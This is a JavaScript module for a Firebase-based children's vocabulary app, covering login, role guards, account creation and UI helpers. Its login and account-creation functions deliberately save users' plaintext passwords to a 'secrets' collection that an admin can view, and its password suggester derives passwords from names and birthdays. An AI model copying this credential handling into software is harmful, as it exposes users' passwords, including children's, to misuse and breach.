/* =========================================================
   Wesh Words — noyau commun (Firebase + utilitaires)
   © Hélène Laruelle — Tous droits réservés
   ========================================================= */
import { initializeApp, deleteApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut,
  onAuthStateChanged, sendPasswordResetEmail, updatePassword, updateEmail, deleteUser,
  setPersistence, browserLocalPersistence
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import {
  initializeFirestore, getFirestore, persistentLocalCache, persistentMultipleTabManager,
  doc, getDoc, getDocs, setDoc, updateDoc, deleteDoc, addDoc, collection, query, where,
  orderBy, limit, onSnapshot, writeBatch, serverTimestamp, arrayRemove, arrayUnion, getDocFromServer
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { DEFAULT_CONTENT, LEGAL_PAGES } from "./content.js";

export const VERSION = "V03-006";
export const PROJECT = "Wesh Words";
export const PSEUDO_DOMAIN = "weshwords.firebaseapp.com"; // e-mail technique pour les comptes sans adresse

export const firebaseConfig = {
  apiKey: "AIzaSyC4OJGi38d55XRe3gLkXvpVGJFi-rbHxI0",
  authDomain: "weshwords.firebaseapp.com",
  projectId: "weshwords",
  storageBucket: "weshwords.firebasestorage.app",
  messagingSenderId: "791791228821",
  appId: "1:791791228821:web:399ecac8f9d963650fc89c"
};

export const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
setPersistence(auth, browserLocalPersistence).catch(() => {});

let _db;
try {
  _db = initializeFirestore(app, { localCache: persistentLocalCache({ tabManager: persistentMultipleTabManager() }) });
} catch (e) {
  _db = getFirestore(app);
}
export const db = _db;

export {
  doc, getDoc, getDocs, setDoc, updateDoc, deleteDoc, addDoc, collection, query, where,
  orderBy, limit, onSnapshot, writeBatch, serverTimestamp, arrayRemove, arrayUnion, getDocFromServer,
  signOut, onAuthStateChanged, sendPasswordResetEmail, createUserWithEmailAndPassword
};

/* ---------------- Utilitaires ---------------- */
export const $ = (s, r = document) => r.querySelector(s);
export const $$ = (s, r = document) => [...r.querySelectorAll(s)];
export function esc(s) {
  return String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}
export function stripAccents(s) { return String(s ?? "").normalize("NFD").replace(/[\u0300-\u036f]/g, ""); }
export function slugUser(s) {
  return stripAccents(String(s ?? "").trim().toLowerCase()).replace(/[^a-z0-9._-]/g, "");
}
export function todayKey(d = new Date()) {
  const p = n => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}`;
}
export function dayKeyOffset(key, delta) {
  const [y, m, d] = key.split("-").map(Number);
  const dt = new Date(y, m - 1, d + delta);
  return todayKey(dt);
}
export function fmtDay(key) {
  if (!key) return "";
  const [y, m, d] = key.split("-").map(Number);
  return new Date(y, m - 1, d).toLocaleDateString("fr-BE", { weekday: "short", day: "numeric", month: "short" });
}
export function fmtTs(ts) {
  if (!ts) return "";
  const d = ts.toDate ? ts.toDate() : new Date(ts);
  return d.toLocaleString("fr-BE", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" });
}
export function toast(msg, type = "ok") {
  let box = $("#toasts");
  if (!box) { box = document.createElement("div"); box.id = "toasts"; document.body.appendChild(box); }
  const t = document.createElement("div");
  t.className = "toast " + type;
  t.textContent = msg;
  box.appendChild(t);
  setTimeout(() => t.classList.add("out"), 3200);
  setTimeout(() => t.remove(), 3800);
}
export function shuffle(a) {
  a = [...a];
  for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; }
  return a;
}
export function errMsg(e) {
  const c = e?.code || "";
  const map = {
    "auth/invalid-credential": "Utilisateur ou mot de passe incorrect.",
    "auth/wrong-password": "Utilisateur ou mot de passe incorrect.",
    "auth/user-not-found": "Utilisateur ou mot de passe incorrect.",
    "auth/invalid-email": "Adresse e-mail invalide.",
    "auth/email-already-in-use": "Cette adresse e-mail est déjà utilisée.",
    "auth/weak-password": "Mot de passe trop faible (6 caractères minimum).",
    "auth/too-many-requests": "Trop de tentatives. Réessaie dans quelques minutes.",
    "auth/network-request-failed": "Pas de connexion internet.",
    "auth/operation-not-allowed": "Active la méthode « E-mail/Mot de passe » dans Firebase Authentication.",
    "auth/unauthorized-domain": "Ce domaine n'est pas autorisé dans Firebase Authentication (Paramètres → Domaines autorisés).",
    "permission-denied": "Accès refusé (règles Firestore)."
  };
  return map[c] || e?.message || String(e);
}

/* ---------------- Mots de passe : masqués + icône œil ---------------- */
const EYE = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>';
const EYE_OFF = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a20.3 20.3 0 0 1 5.06-5.94M9.9 4.24A10.7 10.7 0 0 1 12 4c7 0 11 7 11 7a20.4 20.4 0 0 1-2.16 3.19M1 1l22 22"/><path d="M14.12 14.12A3 3 0 1 1 9.88 9.88"/></svg>';
export function enhancePasswords(root = document) {
  $$('input[type="password"]:not([data-eye])', root).forEach(inp => {
    inp.dataset.eye = "1";
    const wrap = document.createElement("div");
    wrap.className = "pwd-wrap";
    inp.parentNode.insertBefore(wrap, inp);
    wrap.appendChild(inp);
    const b = document.createElement("button");
    b.type = "button"; b.className = "eye"; b.innerHTML = EYE;
    b.setAttribute("aria-label", "Afficher le mot de passe");
    b.onclick = () => {
      const show = inp.type === "password";
      inp.type = show ? "text" : "password";
      b.innerHTML = show ? EYE_OFF : EYE;
      b.setAttribute("aria-label", show ? "Masquer le mot de passe" : "Afficher le mot de passe");
    };
    wrap.appendChild(b);
  });
}

/* ---------------- Suggestions identifiant / mot de passe ---------------- */
export function suggestUsername(prenom, nom) {
  const p = slugUser(prenom).replace(/[._-]/g, "");
  const n = slugUser(nom).replace(/[._-]/g, "");
  return p ? `${p}.${n.charAt(0)}` : "";
}
export function suggestPassword(prenom, nom, birth /* yyyy-mm-dd */) {
  const p = slugUser(prenom).replace(/[^a-z]/g, "").slice(0, 3);
  const n = slugUser(nom).replace(/[^a-z]/g, "").slice(0, 3);
  let jjmm = "";
  if (birth && /^\d{4}-\d{2}-\d{2}$/.test(birth)) jjmm = birth.slice(8, 10) + birth.slice(5, 7);
  return p + n + jjmm;
}

/* ---------------- Contenus éditables ---------------- */
let _content = null;
export async function loadContent() {
  if (_content) return _content;
  const base = {};
  DEFAULT_CONTENT.forEach(c => base[c.key] = c.value);
  LEGAL_PAGES.forEach(p => { base[`legal.${p.id}.title`] = p.title; base[`legal.${p.id}.body`] = p.body; });
  try {
    const snap = await getDoc(doc(db, "content", "site"));
    if (snap.exists()) Object.assign(base, snap.data().texts || {});
  } catch (e) { /* hors ligne ou pas encore créé : valeurs par défaut */ }
  _content = base;
  return base;
}
export function T(key, vars = {}) {
  const c = _content || {};
  let s = c[key] ?? (DEFAULT_CONTENT.find(x => x.key === key)?.value) ?? "";
  const all = { annee: new Date().getFullYear(), owner: c["site.owner"] || "", site: c["site.title"] || PROJECT, ...vars };
  return String(s).replace(/\{(\w+)\}/g, (m, k) => (all[k] ?? m));
}
export function applyContent(root = document, vars = {}) {
  $$("[data-t]", root).forEach(el => { el.textContent = T(el.dataset.t, vars); });
  $$("[data-th]", root).forEach(el => { el.innerHTML = T(el.dataset.th, vars); });
  $$("[data-tp]", root).forEach(el => { el.placeholder = T(el.dataset.tp, vars); });
}

/* ---------------- Logo HL (fusée, cercle doré) ---------------- */
export const HL_LOGO = `<svg viewBox="0 0 64 64" width="44" height="44" aria-hidden="true">
  <defs><linearGradient id="hlg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#F7D774"/><stop offset=".5" stop-color="#D4A93C"/><stop offset="1" stop-color="#A67C1E"/></linearGradient></defs>
  <circle cx="32" cy="32" r="30" fill="#10162C" stroke="url(#hlg)" stroke-width="3"/>
  <text x="21" y="41" font-family="Fredoka, Nunito, sans-serif" font-weight="700" font-size="21" fill="url(#hlg)">HL</text>
  <g transform="translate(45 14) rotate(45)"><path d="M0-9c3 3 4 7 4 11l-2 3h-4l-2-3c0-4 1-8 4-11z" fill="url(#hlg)"/><circle cy="-2" r="1.4" fill="#10162C"/><path d="M-2 5l2 4 2-4z" fill="#FF8A3D"/></g>
</svg>`;
export function mountHLLogo() {
  if ($(".hl-badge")) return;
  const a = document.createElement("a");
  a.className = "hl-badge"; a.href = "index.html"; a.title = "Site développé par Hélène Laruelle";
  a.innerHTML = `<img src="assets/hl-logo-128.webp" alt="Logo Hélène Laruelle" width="52" height="52">`;
  document.body.appendChild(a);
}

/* ---------------- Footer ---------------- */
export function renderFooter(el) {
  if (!el) return;
  const links = LEGAL_PAGES.map(p => `<a href="legal.html?p=${p.id}">${esc(T(`legal.${p.id}.title`))}</a>`).join('<span class="sep">|</span>');
  el.innerHTML = `
    <nav class="legal-links">${links}</nav>
    <p>${esc(T("footer.l1"))}</p>
    <p>${esc(T("footer.l2"))}</p>
    <p>${esc(T("footer.l3"))}</p>`;
}

/* ---------------- En-tête des espaces privés ---------------- */
const HOUSE = '<svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l9-8 9 8"/><path d="M5 10v10h14V10"/><path d="M10 20v-6h4v6"/></svg>';
const ROLE_LABEL = { superadmin: "Super Admin", parent: "Parent", enfant: "Élève" };
export function roleLabel(r) { return ROLE_LABEL[r] || r; }
export function renderAppHeader(el, profile, links = []) {
  const nav = links.map(l => `<a class="hbtn ${l.active ? "on" : ""}" href="${l.href}">${esc(l.label)}</a>`).join("");
  el.innerHTML = `
    <div class="brand">
      <a href="index.html" class="logo-mark" aria-label="Accueil">${logoMark()}</a>
      <div>
        <div class="brand-title">${esc(T("site.title"))}</div>
        <div class="brand-sub"><span class="role-badge r-${esc(profile.role)}">${esc(roleLabel(profile.role))}</span><span class="ver">${VERSION}</span></div>
      </div>
    </div>
    <div class="hactions">
      ${nav}
      <a class="hicon" href="index.html" title="Accueil du site" aria-label="Accueil du site">${HOUSE}</a>
      <button class="hicon" id="btnLogout" title="Se déconnecter" aria-label="Se déconnecter"><svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5M21 12H9"/></svg></button>
    </div>`;
  $("#btnLogout", el).onclick = async () => { await signOut(auth); location.href = "connexion.html"; };
}
export function logoMark() {
  return `<img class="logo-img" src="assets/logo-160.webp" alt="Wesh Words" width="46" height="46">`;
}
/* Personnage : Margaux en version animée */
export const MOODS = {
  joyeuse: "assets/margaux-joyeuse.webp", colere: "assets/margaux-colere.webp", reflechie: "assets/margaux-reflechie.webp",
  sure: "assets/margaux-sure.webp", malicieuse: "assets/margaux-malicieuse.webp",
  ensemble: "assets/scene-ensemble.webp", bravo: "assets/scene-bravo.webp", rate: "assets/scene-rate.webp", hero: "assets/margaux-hero.webp"
};

/* ---------------- Authentification (utilisateur + mot de passe) ---------------- */
export async function resolveEmail(identifier) {
  const id = String(identifier || "").trim();
  if (id.includes("@")) return id.toLowerCase();
  const u = slugUser(id);
  if (!u) throw new Error("Indique ton nom d'utilisateur.");
  const snap = await getDoc(doc(db, "usernames", u));
  if (!snap.exists()) { const e = new Error("Utilisateur ou mot de passe incorrect."); e.code = "auth/invalid-credential"; throw e; }
  return snap.data().email;
}
export async function login(identifier, password) {
  const email = await resolveEmail(identifier);
  const cred = await signInWithEmailAndPassword(auth, email, password);
  // on retient l'heure de connexion et le mot de passe réellement tapé (visible par le Super Admin)
  const uid = cred.user.uid;
  updateDoc(doc(db, "users", uid), { lastLogin: serverTimestamp() }).catch(() => {});
  getDoc(doc(db, "users", uid)).then(s => {
    const u = s.data() || {};
    setDoc(doc(db, "secrets", uid), { username: u.username || "", email, password, updatedAt: serverTimestamp() }, { merge: true }).catch(() => {});
  }).catch(() => {});
  return cred;
}
export function currentUser() {
  return new Promise(res => { const off = onAuthStateChanged(auth, u => { off(); res(u); }); });
}
export async function getProfile(uid) {
  const s = await getDoc(doc(db, "users", uid));
  return s.exists() ? { uid, ...s.data() } : null;
}
export function homeFor(role) {
  return role === "superadmin" ? "admin.html" : role === "parent" ? "parent.html" : "eleve.html";
}
/** Garde d'accès : redirige si non connecté ou rôle non autorisé */
export async function guard(roles) {
  const u = await currentUser();
  if (!u) { location.replace("connexion.html"); throw new Error("redirect"); }
  const p = await getProfile(u.uid);
  if (!p) { await signOut(auth); location.replace("connexion.html?e=profil"); throw new Error("redirect"); }
  if (!roles.includes(p.role)) { location.replace(homeFor(p.role)); throw new Error("redirect"); }
  // trace de dernière visite : à chaque ouverture d'une page privée, même sans re-taper le mot de passe
  updateDoc(doc(db, "users", u.uid), { lastSeen: serverTimestamp() }).catch(() => {});
  return { user: u, profile: p };
}

/* ---------------- Modification de fiche (prénom/nom/naissance/gsm, e-mail, identifiant) ---------------- */
export async function updateMemberInfo(uid, { prenom, nom, birth, gsm }) {
  await updateDoc(doc(db, "users", uid), { prenom: prenom || "", nom: nom || "", birth: birth || "", gsm: gsm || "" });
}
/**
 * Change l'e-mail de connexion et/ou l'identifiant d'un membre.
 * oldEmail/oldPwd : identifiants ACTUELS (nécessaires pour reconnecter le compte Firebase Auth).
 * newEmail/newUsername : laisser vide/inchangé pour ne pas modifier ce champ.
 */
export async function changeMemberEmailUsername(uid, { oldEmail, oldPwd, oldUsername, newEmail, newUsername }) {
  let email = (oldEmail || "").trim().toLowerCase();
  const wantEmail = (newEmail || "").trim().toLowerCase();
  if (wantEmail && wantEmail !== email) {
    if (!oldPwd) throw new Error("Le mot de passe actuel est nécessaire pour changer l'adresse e-mail.");
    await withSecondary(async a2 => {
      const cred = await signInWithEmailAndPassword(a2, email, oldPwd);
      await updateEmail(cred.user, wantEmail);
    });
    email = wantEmail;
  }
  const oldU = slugUser(oldUsername);
  const username = slugUser(newUsername) || oldU;
  if (!username) throw new Error("Identifiant obligatoire.");
  const b = writeBatch(db);
  if (username !== oldU) {
    const exists = await getDoc(doc(db, "usernames", username));
    if (exists.exists()) throw new Error(`L'identifiant « ${username} » est déjà pris.`);
    if (oldU) b.delete(doc(db, "usernames", oldU));
    b.set(doc(db, "usernames", username), { email, uid });
  } else if (email !== (oldEmail || "").trim().toLowerCase()) {
    b.set(doc(db, "usernames", username), { email, uid }, { merge: true });
  }
  b.set(doc(db, "users", uid), { email, username, realEmail: !email.endsWith("@" + PSEUDO_DOMAIN) }, { merge: true });
  b.set(doc(db, "secrets", uid), { username, email, updatedAt: serverTimestamp() }, { merge: true });
  await b.commit();
  return { email, username };
}

/* ---------- Instance secondaire : créer / gérer un compte sans déconnecter l'admin ---------- */
async function withSecondary(fn) {
  const sec = initializeApp(firebaseConfig, "sec-" + Date.now() + Math.random().toString(36).slice(2));
  const a2 = getAuth(sec);
  try { return await fn(a2); }
  finally { try { await signOut(a2); } catch (e) {} try { await deleteApp(sec); } catch (e) {} }
}
/** Diagnostic : tente une connexion avec un compte inexistant et renvoie le code d'erreur Firebase */
export function probeAuth() {
  return withSecondary(async a2 => {
    try { await signInWithEmailAndPassword(a2, `diagnostic-${Date.now()}@${PSEUDO_DOMAIN}`, "diag-" + Math.random().toString(36)); return "signed-in"; }
    catch (e) { return e?.code || String(e?.message || e); }
  });
}
export function createAuthAccount(email, password) {
  return withSecondary(async a2 => (await createUserWithEmailAndPassword(a2, email, password)).user.uid);
}
export function changeAuthPassword(email, oldPwd, newPwd) {
  return withSecondary(async a2 => { const c = await signInWithEmailAndPassword(a2, email, oldPwd); await updatePassword(c.user, newPwd); });
}
export function deleteAuthAccount(email, pwd) {
  return withSecondary(async a2 => { const c = await signInWithEmailAndPassword(a2, email, pwd); await deleteUser(c.user); });
}

/**
 * Crée un compte complet : Auth + users/{uid} + usernames/{username} + secrets/{uid}
 * data : { prenom, nom, username, email?, password, role, parentUid?, birth?, gsm? }
 */
export async function createMember(data) {
  const username = slugUser(data.username);
  if (!username) throw new Error("Identifiant obligatoire.");
  if (!data.password || data.password.length < 6) throw new Error("Mot de passe : 6 caractères minimum.");
  const exists = await getDoc(doc(db, "usernames", username));
  if (exists.exists()) throw new Error(`L'identifiant « ${username} » est déjà pris.`);
  const email = (data.email || "").trim().toLowerCase() || `${username}@${PSEUDO_DOMAIN}`;
  const uid = await createAuthAccount(email, data.password);
  const b = writeBatch(db);
  b.set(doc(db, "users", uid), {
    prenom: data.prenom || "", nom: data.nom || "", username, email,
    realEmail: !!(data.email || "").trim(), role: data.role,
    parentUid: data.parentUid || null, birth: data.birth || "", gsm: data.gsm || "",
    createdAt: serverTimestamp(), createdBy: auth.currentUser?.uid || null
  });
  b.set(doc(db, "usernames", username), { email, uid });
  b.set(doc(db, "secrets", uid), { username, email, password: data.password, updatedAt: serverTimestamp() });
  if (data.role === "enfant") b.set(doc(db, "users", uid, "meta", "shame"), { queue: [], lastRevealDay: "" });
  await b.commit();
  return uid;
}

/* ---------------- PWA ---------------- */
export function registerSW() {
  if ("serviceWorker" in navigator && location.protocol.startsWith("http")) {
    navigator.serviceWorker.register("sw.js").catch(() => {});
  }
}

/* ---------------- Initialisation page publique ---------------- */
export async function initPublicPage(vars) {
  await loadContent();
  applyContent(document, vars);
  renderFooter($("#footer"));
  mountHLLogo();
  enhancePasswords();
  registerSW();
  document.title = document.title.replace("Wesh Words", T("site.title"));
}
export async function initPrivatePage() {
  await loadContent();
  applyContent();
  enhancePasswords();
  registerSW();
}
